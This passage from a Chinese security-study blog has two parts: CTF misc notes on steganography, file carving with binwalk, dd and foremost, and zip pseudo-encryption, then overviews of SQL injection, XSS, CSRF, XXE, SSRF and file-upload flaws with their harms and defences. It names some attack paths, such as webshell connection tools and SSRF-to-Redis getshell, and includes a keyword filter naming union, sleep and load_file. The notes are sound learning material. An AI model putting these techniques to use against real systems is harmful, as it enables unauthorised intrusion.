<figure class="highlight gcode"><table><tr><td class="code"><pre><span class="line"><span class="number">86</span>MygAZ<span class="number">2</span>uJi<span class="number">2</span>oCxctsd<span class="number">28</span>LB<span class="symbol">NRXHPLykF5</span>LBz<span class="number">8</span>f<span class="number">1</span>xEikW<span class="symbol">NVpKfpce2</span>CMHvhSJUdk<span class="number">7</span>CHLrEVhGRVQvMwT<span class="number">8</span>r<span class="number">7</span>JUgVWGb<span class="symbol">nzxb</span></span><br></pre></td></tr></table></figure>

<p>用<code>ciphey</code> 得到<code>flag</code></p>
<p><img src="/2022/09/27/crypto+misc/image-20220927161352763.png" alt="image-20220927161352763"></p>
<h2 id="6-隐藏秘密-flag-到图片、音乐"><a href="#6-隐藏秘密-flag-到图片、音乐" class="headerlink" title="6.隐藏秘密(flag)到图片、音乐"></a>6.隐藏秘密(flag)到图片、音乐</h2><h3 id="win10"><a href="#win10" class="headerlink" title="win10"></a>win10</h3><p><code>Silenteye</code></p>
<p><img src="/2022/09/27/crypto+misc/image-20220927162235740.png" alt="image-20220927162235740"></p>
<p>把图片或者声音拖入其中</p>
<p><img src="/2022/09/27/crypto+misc/image-20220927162311232.png" alt="image-20220927162311232"></p>
<p>然后执行<code>Decode</code></p>
<p><img src="/2022/09/27/crypto+misc/image-20220927162351939.png" alt="image-20220927162351939"></p>
<p>得到加密信息</p>
<p>用<code>ciphey</code> 得到<code>flag</code></p>
<p><img src="/2022/09/27/crypto+misc/image-20220927162441904.png" alt="image-20220927162441904"></p>
<h2 id="7-小游戏"><a href="#7-小游戏" class="headerlink" title="7.小游戏"></a>7.小游戏</h2><h3 id="win10-1"><a href="#win10-1" class="headerlink" title="win10"></a>win10</h3><p><code>CE修改器，懂得都懂</code></p>
<h2 id="8-Java类的"><a href="#8-Java类的" class="headerlink" title="8.Java类的"></a>8.Java类的</h2><p>利用<code>jd-gui</code>对java反汇编，看看有没有信息</p>
<h2 id="9-二维码"><a href="#9-二维码" class="headerlink" title="9.二维码"></a>9.二维码</h2><h3 id="1）缺少定位点"><a href="#1）缺少定位点" class="headerlink" title="1）缺少定位点"></a>1）缺少定位点</h3><p><img src="/2022/09/27/crypto+misc/image-20220927163933448.png" alt="image-20220927163933448"></p>
<p>利用<code>ps</code>把两者拼接起来就可以了</p>
<h2 id="10-分离图片中的隐藏文件"><a href="#10-分离图片中的隐藏文件" class="headerlink" title="10.分离图片中的隐藏文件"></a>10.分离图片中的隐藏文件</h2><p><a href="https://blog.csdn.net/qq_43531669/article/details/113732757">原文链接</a></p>
<h3 id="1）图片分析"><a href="#1）图片分析" class="headerlink" title="1）图片分析:"></a>1）图片分析:</h3><p>如图为CTF题目中一个隐藏文件的图片</p>
<p>首先对图片进行分析，这里介绍一个工具binwalk（kali中是自带的，也可以下载到windows中使用）。</p>
<p>使用方法：binwalk + 文件路径&#x2F;文件名</p>
<figure class="highlight apache"><table><tr><td class="code"><pre><span class="line"><span class="attribute">binwalk</span> <span class="number">1</span>.jpg</span><br></pre></td></tr></table></figure>

<p>执行命令后，binwalk就会自动分析这个jpg文件：</p>
<p><img src="/2022/09/27/crypto+misc/image-20220927165710470.png" alt="image-20220927165710470"></p>
<p>从分析的结果看，这个jpg文件隐藏着一个zip文件，从48221块偏移开始就是zip文件。</p>
<h3 id="2、如何分离："><a href="#2、如何分离：" class="headerlink" title="2、如何分离："></a>2、如何分离：</h3><p>在得到隐藏信息后，改如何把zip文件分离出，下面介绍几种方法：</p>
<h4 id="2-1、binwalk-分离："><a href="#2-1、binwalk-分离：" class="headerlink" title="2.1、binwalk 分离："></a>2.1、binwalk 分离：</h4><p>还是使用binwalk工具，使用dd命令分离出隐藏文件：</p>
<figure class="highlight routeros"><table><tr><td class="code"><pre><span class="line">dd <span class="attribute">if</span>=1.jpg <span class="attribute">of</span>=1.zip <span class="attribute">skip</span>=48221 <span class="attribute">bs</span>=1</span><br></pre></td></tr></table></figure>

<p>解释：if 指定输入文件，of 指定输出文件，skip 指定从输入文件开头跳过48221个块后开始复制，</p>
<p>bs设置每次读写块的大小为1字节</p>
<p>执行后会得到一个1.zip文件。</p>
<p><img src="/2022/09/27/crypto+misc/image-20220927165740304.png" alt="image-20220927165740304"></p>
<h4 id="2-2、foremost-工具分离："><a href="#2-2、foremost-工具分离：" class="headerlink" title="2.2、foremost 工具分离："></a>2.2、foremost 工具分离：</h4><p>foremost是一个基于文件文件头和尾部信息以及文件的内建数据结构恢复文件的命令行工具，win可以下载使用，Linux可以通过下面命令安装使用：</p>
<figure class="highlight routeros"><table><tr><td class="code"><pre><span class="line">apt-<span class="built_in">get</span> install foremost</span><br></pre></td></tr></table></figure>


<p>Linux下分离文件的命令为：</p>
<figure class="highlight apache"><table><tr><td class="code"><pre><span class="line"><span class="attribute">foremost</span> <span class="number">1</span>.jpg</span><br></pre></td></tr></table></figure>


<p>执行命令后，foremost会生成output目录存放分离出的文件。</p>
<p>Win下是把文件直接拖到 foremost.exe上，也会生成output目录存放分离出的文件。</p>
<p><img src="/2022/09/27/crypto+misc/image-20220927165802749.png" alt="image-20220927165802749"></p>
<h4 id="2-3、hex编辑器分离："><a href="#2-3、hex编辑器分离：" class="headerlink" title="2.3、hex编辑器分离："></a>2.3、hex编辑器分离：</h4><p>hex编辑器有很多，win下有用得较多的winhex、UltraEdit等，linux下有hexeditor等。这里我们以winhex为例来手动分离。</p>
<p>一个完整的 jpg 文件由 FF D8 开头，FF D9结尾，图片查看器会忽略 FF D9 以后的内容，因此可以在 jpg 文件中加入其他文件。</p>
<p>经过上面的分析， 知道图片中隐藏了zip文件，zip文件的开头16进制为504B0304，先搜索16进制文本 FFD9，然后后面跟着504B0304，于是就可以从 50 开始，复制到最后（因为这里只有一个zip，所以复制到最后），另存为新文件，就得到了隐藏的压缩包。</p>
<p><img src="/2022/09/27/crypto+misc/image-20220927165829838.png" alt="image-20220927165829838"></p>
<p><img src="/2022/09/27/crypto+misc/image-20220927165845340.png" alt="image-20220927165845340"></p>
<p><img src="/2022/09/27/crypto+misc/image-20220927165911140.png" alt="image-20220927165911140"></p>
<h4 id="2-4、改后缀名："><a href="#2-4、改后缀名：" class="headerlink" title="2.4、改后缀名："></a>2.4、改后缀名：</h4><p>分析知道隐藏文件是zip后，有一个简单粗暴的方法是直接把图片的后缀改为.zip，然后解压即可（这种方法虽然简单快速，但如果隐写了多个文件时可能会失败）。</p>
<h2 id="11-多图片拼图"><a href="#11-多图片拼图" class="headerlink" title="11.多图片拼图"></a>11.多图片拼图</h2><p><a href="https://blog.csdn.net/m0_62291930/article/details/124139016">原文链接</a></p>
<p>Misc 自动拼图<br>需要使用<code>python</code>遗传算法脚本<code>gaps</code>和拼图脚本<code>montage</code></p>
<p>开始拼图<br>以ctf中的一道训练题puzzle为例</p>
<p>如果图片为碎片状，根据总数确定拼块长宽数量，并用montage进行第一次拼接</p>
<p><img src="/2022/09/27/crypto+misc/image-20220927171241532.png" alt="image-20220927171241532"></p>
<figure class="highlight 1c"><table><tr><td class="code"><pre><span class="line"><span class="meta">#如左下角所示，总数为256块，即图片以16×16拆分而成的（要在拼块目录下运行命令），</span></span><br><span class="line"><span class="meta">#*.png为拼块格式，16×16为长宽数量，flag.png为合成后的图片名</span></span><br></pre></td></tr></table></figure>

<figure class="highlight apache"><table><tr><td class="code"><pre><span class="line"><span class="attribute">montage</span> *.png -tile <span class="number">16</span>x16 -geometry +<span class="number">0</span>+<span class="number">0</span> flag.png   </span><br></pre></td></tr></table></figure>



<p>运行后在目录下可找到如下图片</p>
<p><img src="/2022/09/27/crypto+misc/image-20220927171709538.png" alt="image-20220927171709538"></p>
<p>运行后在目录下可找到如下图片</p>
<p><strong>接着最关键的一点，调整图片长宽比为1：1，可以用PS-&gt;图像大小，以较大数值为边长，扩充为正方形（方便后续size的计算），否则后期gaps无法获得最佳效果</strong></p>
<p><img src="/2022/09/27/crypto+misc/image-20220927171907186.png" alt="image-20220927171907186"></p>
<p><img src="/2022/09/27/crypto+misc/image-20220927171924733.png" alt="image-20220927171924733"></p>
<p>接下来就是调用gaps脚本实现自动拼图排序<strong>（重点）</strong></p>
<p><img src="/2022/09/27/crypto+misc/image-20220927171940838.png" alt="image-20220927171940838"></p>
<figure class="highlight routeros"><table><tr><td class="code"><pre><span class="line"><span class="comment">#此处的size为正方形小拼块的边长像素，由于刚刚经过拉伸，拼块从160×100变成了160×160</span></span><br><span class="line"><span class="comment">#注意是小的正方形像素，比如拼接完成的为360px，而一列有12张图，那size为12px</span></span><br><span class="line">gaps <span class="attribute">--image</span>=flag.png <span class="attribute">--size</span>=160 --save     </span><br></pre></td></tr></table></figure>

<p><img src="/2022/09/27/crypto+misc/image-20220927171957840.png" alt="image-20220927171957840"></p>
<figure class="highlight maxima"><table><tr><td class="code"><pre><span class="line">补充：gaps各参数的作用</span><br><span class="line"></span><br><span class="line">–<span class="built_in">image</span> 指向拼图的路径</span><br><span class="line">–size 拼图块的像素尺寸</span><br><span class="line">–generations 遗传算法的代的数量</span><br><span class="line">–population 个体数量</span><br><span class="line">–<span class="built_in">verbose</span> 每一代训练结束后展示最佳结果</span><br><span class="line">–<span class="built_in">save</span> 将拼图还原为图像</span><br></pre></td></tr></table></figure>



<figure class="highlight mel"><table><tr><td class="code"><pre><span class="line">总结</span><br><span class="line">最有挑战性的地方莫过于安装gaps和对gaps参数的把握，特别是sized的计算,需要先使图片的拼块恰好为像素最大的一条边的正方形，<span class="keyword">size</span>=该边长像素。另外，pip和<span class="keyword">python</span>库要提前安装完毕</span><br></pre></td></tr></table></figure>

<h2 id="12-zip伪加密【360压缩无视伪加密】"><a href="#12-zip伪加密【360压缩无视伪加密】" class="headerlink" title="12.zip伪加密【360压缩无视伪加密】"></a>12.zip伪加密【360压缩无视伪加密】</h2><h3 id="1-zip-文件"><a href="#1-zip-文件" class="headerlink" title="1)zip 文件"></a>1)zip 文件</h3><figure class="highlight stata"><table><tr><td class="code"><pre><span class="line">一个 <span class="keyword">ZIP</span> 文件由三个部分组成：</span><br><span class="line"></span><br><span class="line">压缩源文件数据区+压缩源文件目录区+压缩源文件目录结束标志</span><br></pre></td></tr></table></figure>



<h3 id="2-伪加密原理"><a href="#2-伪加密原理" class="headerlink" title="2)伪加密原理"></a>2)伪加密原理</h3><figure class="highlight autohotkey"><table><tr><td class="code"><pre><span class="line">zip伪加密是在文件头的加密标志位做修改，进而再打开文件时识被别为加密压缩包。</span><br><span class="line"></span><br><span class="line">把 压缩源文件目录区 的 全局方式位标记  的 `01 <span class="number">00</span>` 或 `09 <span class="number">00</span>` 改为 `00 <span class="number">00</span>`  就可以去除密码</span><br><span class="line"></span><br><span class="line">把 压缩源文件目录区 的 全局方式位标记  的 `00 <span class="number">00</span>` 改为  `01 <span class="number">00</span>` 或 `09 <span class="number">00</span>`  就可以添加密码 提示</span><br></pre></td></tr></table></figure>



<h3 id="3-压缩源文件数据区"><a href="#3-压缩源文件数据区" class="headerlink" title="3)压缩源文件数据区"></a>3)压缩源文件数据区</h3><figure class="highlight apache"><table><tr><td class="code"><pre><span class="line"><span class="attribute">50</span> <span class="number">4</span>B <span class="number">03</span> <span class="number">04</span>：这是头文件标记（<span class="number">0</span>x04034b50） </span><br><span class="line"><span class="attribute">14</span> <span class="number">00</span>：解压文件所需 pkware 版本 </span><br><span class="line"><span class="attribute">00</span> <span class="number">00</span>：全局方式位标记（有无加密） </span><br><span class="line"><span class="attribute">08</span> <span class="number">00</span>：压缩方式 </span><br><span class="line"><span class="attribute">5A</span> <span class="number">7</span>E：最后修改文件时间 </span><br><span class="line"><span class="attribute">F7</span> <span class="number">46</span>：最后修改文件日期 </span><br><span class="line"><span class="attribute">16</span> B5 <span class="number">80</span> <span class="number">14</span>：CRC-<span class="number">32</span>校验（<span class="number">1480</span>B516） </span><br><span class="line"><span class="attribute">19</span> <span class="number">00</span> <span class="number">00</span> <span class="number">00</span>：压缩后尺寸（<span class="number">25</span>） </span><br><span class="line"><span class="attribute">17</span> <span class="number">00</span> <span class="number">00</span> <span class="number">00</span>：未压缩尺寸（<span class="number">23</span>） </span><br><span class="line"><span class="attribute">07</span> <span class="number">00</span>：文件名长度 </span><br><span class="line"><span class="attribute">00</span> <span class="number">00</span>：扩展记录长度 </span><br></pre></td></tr></table></figure>



<h3 id="4-压缩源文件目录区："><a href="#4-压缩源文件目录区：" class="headerlink" title="4)压缩源文件目录区："></a>4)压缩源文件目录区：</h3><figure class="highlight apache"><table><tr><td class="code"><pre><span class="line"><span class="attribute">50</span> <span class="number">4</span>B <span class="number">01</span> <span class="number">02</span>：目录中文件文件头标记(<span class="number">0</span>x02014b50) </span><br><span class="line"><span class="attribute">3F</span> <span class="number">00</span>：压缩使用的 pkware 版本 </span><br><span class="line"><span class="attribute">14</span> <span class="number">00</span>：解压文件所需 pkware 版本 </span><br><span class="line"><span class="attribute">00</span> <span class="number">00</span>：全局方式位标记（有无加密，这个更改这里进行伪加密，改为<span class="number">09</span> <span class="number">00</span>打开就会提示有密码了） </span><br><span class="line"><span class="attribute">08</span> <span class="number">00</span>：压缩方式 </span><br><span class="line"><span class="attribute">5A</span> <span class="number">7</span>E：最后修改文件时间 </span><br><span class="line"><span class="attribute">F7</span> <span class="number">46</span>：最后修改文件日期 </span><br><span class="line"><span class="attribute">16</span> B5 <span class="number">80</span> <span class="number">14</span>：CRC-<span class="number">32</span>校验（<span class="number">1480</span>B516） </span><br><span class="line"><span class="attribute">19</span> <span class="number">00</span> <span class="number">00</span> <span class="number">00</span>：压缩后尺寸（<span class="number">25</span>） </span><br><span class="line"><span class="attribute">17</span> <span class="number">00</span> <span class="number">00</span> <span class="number">00</span>：未压缩尺寸（<span class="number">23</span>） </span><br><span class="line"><span class="attribute">07</span> <span class="number">00</span>：文件名长度 </span><br><span class="line"><span class="attribute">24</span> <span class="number">00</span>：扩展字段长度 </span><br><span class="line"><span class="attribute">00</span> <span class="number">00</span>：文件注释长度 </span><br><span class="line"><span class="attribute">00</span> <span class="number">00</span>：磁盘开始号 </span><br><span class="line"><span class="attribute">00</span> <span class="number">00</span>：内部文件属性 </span><br><span class="line"><span class="attribute">20</span> <span class="number">00</span> <span class="number">00</span> <span class="number">00</span>：外部文件属性 </span><br><span class="line"><span class="attribute">00</span> <span class="number">00</span> <span class="number">00</span> <span class="number">00</span>：局部头部偏移量 </span><br><span class="line"><span class="attribute">6B65792E7478740A00200000000000010018006558F04A1CC5D001BDEBDD3B1CC5D001BDEBDD3B1CC5D001</span> </span><br><span class="line"></span><br></pre></td></tr></table></figure>



<h3 id="5-压缩源文件目录结束标志："><a href="#5-压缩源文件目录结束标志：" class="headerlink" title="5)压缩源文件目录结束标志："></a>5)压缩源文件目录结束标志：</h3><figure class="highlight basic"><table><tr><td class="code"><pre><span class="line"><span class="symbol">50 </span><span class="number">4</span>B <span class="number">05</span> <span class="number">06</span>：目录结束标记 </span><br><span class="line"><span class="symbol">00 </span><span class="number">00</span>：当前磁盘编号 </span><br><span class="line"><span class="symbol">00 </span><span class="number">00</span>：目录区开始磁盘编号 </span><br><span class="line"><span class="symbol">01 </span><span class="number">00</span>：本磁盘上纪录总数 </span><br><span class="line"><span class="symbol">01 </span><span class="number">00</span>：目录区中纪录总数 </span><br><span class="line"><span class="symbol">59 </span><span class="number">00</span> <span class="number">00</span> <span class="number">00</span>：目录区尺寸大小 </span><br><span class="line"><span class="number">3</span>E <span class="number">00</span> <span class="number">00</span> <span class="number">00</span>：目录区对第一张磁盘的偏移量 </span><br><span class="line"><span class="symbol">00 </span><span class="number">00</span>：ZIP 文件注释长度</span><br><span class="line"></span><br></pre></td></tr></table></figure>



<h3 id="6-查找压缩文件目录区"><a href="#6-查找压缩文件目录区" class="headerlink" title="6)查找压缩文件目录区"></a>6)查找压缩文件目录区</h3><figure class="highlight tap"><table><tr><td class="code"><pre><span class="line">一般面对一些小的文件时 很容易就找到  压缩文件目录区 的文件头</span><br><span class="line"></span><br><span class="line">但是当我们面对一些较大的文件 找 压缩文件目录区的 文件头 <span class="number"> 50 </span>4B<span class="number"> 01 </span>02 就有点麻烦了</span><br><span class="line"></span><br><span class="line">我们可以利用 winhex 中的查找 字符查找 快速找到  压缩文件目录区  的文件头</span><br><span class="line"></span><br><span class="line">然后把 后面的 全方位标记区 的<span class="number"> 01 </span>00 或<span class="number"> 09 </span>00  改为<span class="number"> 00 </span>00 保存 后就可以打开压缩包了</span><br></pre></td></tr></table></figure>

]]></content>
      <categories>
        <category>网络安全学习</category>
      </categories>
      <tags>
        <tag>misc</tag>
      </tags>
  </entry>
  <entry>
    <title>WEB学习</title>
    <url>/2022/05/28/Web-study/</url>
    <content><![CDATA[<p><code>学会一样东西，最重要特征就是可以把一个知识点的原理弄懂，造成一次成功注入，要注意分析源码当中导致这个漏洞的问题点，又应该如何改进与防御，</code></p>
<p><code>不要急于求成，慢即是快，少即是多</code></p>
<p><code>好记性不如烂笔头，一些知识点还是要多写几遍来记住，不是简单ctrl+c/+v就学到了，上机自己练习，打靶场，永远是最有效的方法，一定学会文章和实际操作密切结合，坚持做笔记</code></p>
<p><code>学东西就只当学一次，一次学到最好，不要囫囵吞枣</code></p>
<span id="more"></span>

<hr>
<h1 id="基础漏洞知识"><a href="#基础漏洞知识" class="headerlink" title="基础漏洞知识"></a>基础漏洞知识</h1><blockquote>
<p>–转载原文链接：<a href="https://blog.csdn.net/c_programj/article/details/117452836">https://blog.csdn.net/c_programj/article/details/117452836</a></p>
</blockquote>
<h2 id="一、sql漏洞篇"><a href="#一、sql漏洞篇" class="headerlink" title="一、sql漏洞篇"></a>一、sql漏洞篇</h2><blockquote>
<p><a href="#%E4%B8%80%E3%80%81sql">sql漏洞知识点记录</a></p>
</blockquote>
<h3 id="1-sql漏洞原理"><a href="#1-sql漏洞原理" class="headerlink" title="1.sql漏洞原理"></a>1.sql漏洞原理</h3><p>指web应用程序<u><strong>对用户输入的数据合法性没有判断</strong></u>，导致攻击者可以<u><strong>构造不同的sql语句来对数据库数据库的操作</strong></u>。（web应用程序对用户输入的数据没有进行过滤，或者过滤不严，就把sql语句带进数据库中进行查询）。</p>
<blockquote>
<p>Sql注入漏洞的产生需要满足两个条件：<br>①参数用户可控：<u><strong>前端传给后端的参数内容是用户可以控制的</strong></u>。<br>②<u><strong>参数代入数据库查询</strong></u>：传入的参数拼接到sql语句，且带入数据库查询。</p>
</blockquote>
<h3 id="2-危害"><a href="#2-危害" class="headerlink" title="2.危害"></a>2.危害</h3><blockquote>
<p>①数据库信息泄漏：数据库中存放的<u><strong>用户的隐私信息的泄露</strong></u>。<br>②网页篡改：通过操作数据库对特定网页进行篡改。<br>③网站被挂马，传播恶意软件：<u><strong>修改数据库一些字段的值，嵌入网马链接</strong></u>，进行挂马攻击。<br>④数据库被恶意操作：数据库服务器被攻击，数据库的系统管理员帐户被窜改。<br>⑤服务器被远程控制，被安装后门。经由数据库服务器提供的操作系统支持，让黑客得以修改或控制操作系统。<br>⑥破坏硬盘数据，瘫痪全系统。</p>
</blockquote>
<h3 id="3-防御"><a href="#3-防御" class="headerlink" title="3.防御"></a>3.防御</h3><blockquote>
<p>①<u><strong>过滤危险字符</strong></u>：例如，采用正则表达式匹配union、sleep、load_file等关键字，如果匹配到，则退出程序。<br>②使用预编译语句：使用PDO预编译语句，需要注意，不要将变量直接拼接到PDO语句中，而是使用占位符进行数据库的增加、删除、修改、查询。<br>③特殊字符转义、使用严格的数据类型。</p>
</blockquote>
<hr>
<h2 id="二、xss漏洞篇"><a href="#二、xss漏洞篇" class="headerlink" title="二、xss漏洞篇"></a>二、xss漏洞篇</h2><h3 id="1-xss漏洞原理"><a href="#1-xss漏洞原理" class="headerlink" title="1.xss漏洞原理"></a>1.xss漏洞原理</h3><p>恶意攻击者<u><strong>往Web页面里嵌入脚本代码</strong></u>（<u><strong>通常是JavaScript编写的恶意代码</strong></u>），当用户浏览该页之时，嵌入其中Web里面的Script代码会被执行，从而达到恶意攻击用户的目的。（恶意攻击者<u><strong>利用网站没有对用户提交数据进行转义处理或者过滤不足的缺点，进而添加一些代码</strong></u>，嵌入到web页面中去。）</p>
<h3 id="2-危害-1"><a href="#2-危害-1" class="headerlink" title="2.危害"></a>2.危害</h3><blockquote>
<p>①盗取用户Cookie。<br>②修改网页内容。<br>③网站挂马。<br>④利用网站重定向。<br>⑤XSS蠕虫。</p>
</blockquote>
<h3 id="3-防御-1"><a href="#3-防御-1" class="headerlink" title="3.防御"></a>3.防御</h3><blockquote>
<p>①过滤输入的数据：包括” ’ ”、”&lt;”、“&lt;”、“&gt;”、“on”等非法字符。<br>②对输出到页面的数据进行相应的编码转换，包括html实体编码、javascript编码等。</p>
</blockquote>
<hr>
<h2 id="三、csrf漏洞篇"><a href="#三、csrf漏洞篇" class="headerlink" title="三、csrf漏洞篇"></a>三、csrf漏洞篇</h2><h3 id="1-csrf漏洞原理"><a href="#1-csrf漏洞原理" class="headerlink" title="1.csrf漏洞原理"></a>1.csrf漏洞原理</h3><p>因为web应用程序在用户进行敏感操作时，如修改账号密码、添加账号、转账等，<u><strong>没有校验表单token或者http请求头中的referer值</strong></u>（如果您<u><strong>在网页1，点击一个链接到网页2</strong></u>，当浏览器<u><strong>请求网页2时，网页1的URL就会包含在 Referer 头信息</strong></u>中），从而<u><strong>导致恶意攻击者利用普通用户的身份（cookie）完成攻击行为</strong></u>。</p>
<p><img src="https://img-blog.csdnimg.cn/20210601210954715.png?x-oss-process=image/watermark,type_ZmFuZ3poZW5naGVpdGk,shadow_10,text_aHR0cHM6Ly9ibG9nLmNzZG4ubmV0L2NfcHJvZ3JhbWo=,size_16,color_FFFFFF,t_70" alt="在这里插入图片描述"></p>
<p>Csrf攻击过程两个重点：</p>
<blockquote>
<p>①目标用户<u><strong>已经登录了网站</strong></u>，<u><strong>能够执行网站的功能</strong></u>。<br>②目标用户<u><strong>访问了攻击者构造的URL</strong></u>。</p>
</blockquote>
<h3 id="2-危害-2"><a href="#2-危害-2" class="headerlink" title="2.危害"></a>2.危害</h3><blockquote>
<p>①伪造HTTP请求进行未授权操作。<br>②篡改、盗取目标网站上的重要用户数据。<br>③未经允许执行对用户名誉或者资产有害的操作，比如：散播不良信息、进行消费等。<br>④如果通过使用社工等方式攻击网站管理员、会危害网站本身的安全性。<br>⑤作为其他攻击向量的辅助攻击手法，必须配合XSS<br>⑥传播CSRF蠕虫</p>
</blockquote>
<h3 id="3-防御-2"><a href="#3-防御-2" class="headerlink" title="3.防御"></a>3.防御</h3><blockquote>
<p>①验证请求的<u><strong><code>referer</code></strong></u>值，如果referer是以自己的网站开头的域名，则说明该请求来自网站自己，是合法的。<u><strong>如果referer是其他网站域名或空白，就有可能是csrf攻击，那么服务器拒绝该请求</strong></u>，但是此方法存在被绕过的可能【<u><strong>brupsuite可以抓包修改referer从而绕过前端过滤</strong></u>】。<br>②csrf攻击之所以能成功，是因为<u><strong>攻击者伪造用户的请求</strong></u>，所以抵御csrf的关键在于：在<u><strong>请求中放入攻击者不能伪造的请求</strong></u>，例如，可以在HTTP请求中加入一个随机产生的token，并在服务器端<u><strong>验证token</strong></u>【<u><strong>类似于验证码</strong></u>】，如果请求中没有token或者token内容不正确，则认为请求可能是csrf攻击，从而拒绝该请求。</p>
</blockquote>
<hr>
<h2 id="四、xxe漏洞篇"><a href="#四、xxe漏洞篇" class="headerlink" title="四、xxe漏洞篇"></a>四、xxe漏洞篇</h2><h3 id="1-xxe漏洞原理"><a href="#1-xxe漏洞原理" class="headerlink" title="1.xxe漏洞原理"></a>1.xxe漏洞原理</h3><p>XML 外部实体攻击是针对解析 XML 输入的应用程序的一种攻击。当<strong>包含对外部实体的引用的 XML 输入由弱配置的 XML 解析器处理</strong>时，就会发生这种攻击。这种攻击可能导致<strong>机密数据泄露、拒绝服务、服务器端请求伪造、从解析器所在机器的角度进行端口扫描</strong>等系统影响。</p>
<p>攻击可能包括使用系统标识符中的 <code>file: 方案或相对路径公开本地文件</code>，这些文件<strong>可能包含敏感数据，例如密码或私人用户数据</strong>。由于<strong>攻击发生与处理 XML 文档的应用程序相关</strong>，因此<strong>攻击者可能会使用此受信任的应用程序转向其他内部系统</strong>，可能通过 http(s) 请求泄露其他内部内容或<strong>对任何未受保护的内部服务发起 CSRF 攻击</strong>。在某些情况下，易受客户端内存损坏问题影响的 XML 处理器库<strong>可能会通过解除对恶意 URI 的引用而被利用</strong>，<strong>从而可能允许在应用程序帐户下执行任意代码</strong>。其他攻击可以访问可能不会停止返回数据的本地资源，</p>
<p>一般来说，我们可以区分以下几种 XXE 攻击：</p>
<blockquote>
<ul>
<li>典型注入：在这种情况下，外部实体包含在本地 DTD 中</li>
<li>盲注：响应中没有显示输出和&#x2F;或错误</li>
<li>报错注入：尝试在错误消息中获取资源的内容</li>
</ul>
</blockquote>
<p>XML文档结构包括<u><strong>XML声明、DTD文档类型定义（可选）、文档元素</strong></u>。</p>
<h3 id="2-危害-3"><a href="#2-危害-3" class="headerlink" title="2.危害"></a>2.危害</h3><blockquote>
<p>①读取任意文件。<br>②执行系统命令。<br>③探测内网端口。<br>④攻击内网网站。</p>
</blockquote>
<h3 id="3-防御-3"><a href="#3-防御-3" class="headerlink" title="3.防御"></a>3.防御</h3><blockquote>
<p>①禁止使用<u><strong>外部实体</strong></u>，例如：<br>PHP：libxml_disable_entity_loader(true)<br>②过滤用户提交的xml数据，防止出现非法内容。</p>
</blockquote>
<hr>
<h2 id="五、ssrf漏洞篇"><a href="#五、ssrf漏洞篇" class="headerlink" title="五、ssrf漏洞篇"></a>五、ssrf漏洞篇</h2><h3 id="1-ssrf漏洞原理"><a href="#1-ssrf漏洞原理" class="headerlink" title="1.ssrf漏洞原理"></a>1.ssrf漏洞原理</h3><p>大都是由于<u><strong>服务器提供了从其他服务器应用获取数据的功能</strong></u>且<u><strong>没有对目标地址做过滤与限制</strong></u><strong>。比如从指定URL地址获取网页文本内容，加载指定地址的图片，下载等等。</strong><u><strong>利用的是服务端的请求伪造</strong></u>。SSRF是利用存在缺陷的web应用作为代理攻击远程和本地的服务器。</p>
<p><img src="/2022/05/28/Web-study/image-20220802103546644.png" alt="image-20220802103546644"></p>
<p><img src="/2022/05/28/Web-study/image-20220802103603770.png" alt="image-20220802103603770"></p>
<h3 id="2-危害-4"><a href="#2-危害-4" class="headerlink" title="2.危害"></a>2.危害</h3><p>攻击者就可以<u><strong>利用该漏洞绕过防火墙等访问限制</strong></u>，进而将受感染或存在漏洞的服务器作为代理进行端口扫描，甚至是访问内部系统数据。</p>
<blockquote>
<p>1.可以对外网、服务器所在内网、本地进行端口扫描，获取一些服务的banner 信息</p>
<p>2.攻击运行在内网或本地的应用程序</p>
<p>3.对内网 WEB 应用进行指纹识别，通过访问默认文件实现(如：readme文件)</p>
<p>4.攻击内外网的 web 应用，主要是使用 GET 参数就可以实现的攻击(如：Struts2，sqli)</p>
<p>5.下载内网资源(如：利用file协议读取本地文件等)</p>
<p>6.进行跳板</p>
<p>7.无视cdn</p>
<p>8.利用Redis未授权访问，HTTP CRLF注入实现getshell</p>
</blockquote>
<h3 id="3-防御-4"><a href="#3-防御-4" class="headerlink" title="3.防御"></a>3.防御</h3><blockquote>
<p>① 限制请求的端口只能为web端口，只允许访问HTTP和HTTPS请求。<br>② 限制不能访问内网的IP，以防止对内网进行攻击。<br>③ 屏蔽返回的详细信息。<br>④ 限制请求的端口为HTTP常用的端口，比如 80,443,8080,8088等。</p>
</blockquote>
<blockquote>
<p>PHP中下面函数的使用不当会导致SSRF:</p>
<p>file_get_contents()</p>
<p>fsockopen()<br>#在PHP中fsockopen函数的作用是打开一个网络连接或者一个Unix套接字连接，其语法为“fsockopen($hostname) ”，返回值为一个文件句柄，之后可以被其他文件类函数调用</p>
<p>curl_exec()</p>
</blockquote>
<hr>
<h2 id="六、fileupload漏洞篇"><a href="#六、fileupload漏洞篇" class="headerlink" title="六、fileupload漏洞篇"></a>六、fileupload漏洞篇</h2><h3 id="1-fileupload漏洞原理"><a href="#1-fileupload漏洞原理" class="headerlink" title="1.fileupload漏洞原理"></a>1.fileupload漏洞原理</h3><p>就是未对用户上传的文件进行检查和过滤，导致某些别有用心的用户上传了一些恶意代码或文件（<code>asp、php、jsp</code>等），从而控制了网站。（当文件上传时，如果服务端的脚本语言没有对上传的文件进行检查和过滤，那假如，渗透者直接上传恶意代码文件，那么就有可能直接控制整个网站，或者说以此为跳板，直接拿下服务器，这就是文件上传漏洞。）</p>
<h3 id="2-危害-5"><a href="#2-危害-5" class="headerlink" title="2.危害"></a>2.危害</h3><p><u><strong>非法用户可以利用恶意脚本文件控制整个网站，甚至控制服务器</strong></u>。这个恶意脚本文件，又称为webshell，也可将webshell脚本称为一种网页后门，webshell脚本具有很强大的功能，<u><strong>比如查看服务器目录、服务器中的文件，执行绕过命令等。</strong></u>【<strong>用蚁剑或菜刀连接上传的 php文件，输入文件中的密码</strong>】</p>
<h3 id="3-防御-5"><a href="#3-防御-5" class="headerlink" title="3.防御"></a>3.防御</h3><blockquote>
<p>①通过白名单方式判断文件后缀是否合法。<br>②对上传的文件进行重命名。</p>
</blockquote>
<hr>
<h2 id="七、fileinclude漏洞篇"><a href="#七、fileinclude漏洞篇" class="headerlink" title="七、fileinclude漏洞篇"></a>七、fileinclude漏洞篇</h2><blockquote>
<p><a href="#%E4%B8%83%E3%80%81%E6%96%87%E4%BB%B6%E5%8C%85%E5%90%AB">文件包含漏洞知识点记录</a></p>
</blockquote>
